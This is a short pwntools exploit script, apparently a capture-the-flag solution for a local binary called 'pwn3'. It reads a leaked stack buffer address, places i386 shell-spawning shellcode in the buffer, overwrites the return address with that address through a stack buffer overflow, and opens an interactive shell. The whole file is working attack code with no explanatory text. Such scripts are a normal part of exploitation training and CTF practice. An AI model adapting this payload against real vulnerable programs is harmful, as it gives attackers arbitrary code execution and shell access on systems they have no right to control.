from pwn import *

context.binary = './pwn3'
io = process('./pwn3')
# io = gdb.debug('./pwn3')
io.recvuntil(b'Take this, you might need it on your journey ')
buffer_location = int(io.recvuntil(b'!', drop=True), 16)
log.info(f'Buffer @ 0x{buffer_location:x}')

shellcode = asm(shellcraft.i386.linux.sh())

payload = flat({
    0 : shellcode,
    cyclic_find(0x61626461) : p32(buffer_location),
})

log.info('Sending shell payload!')
io.sendline(payload)
io.interactive()
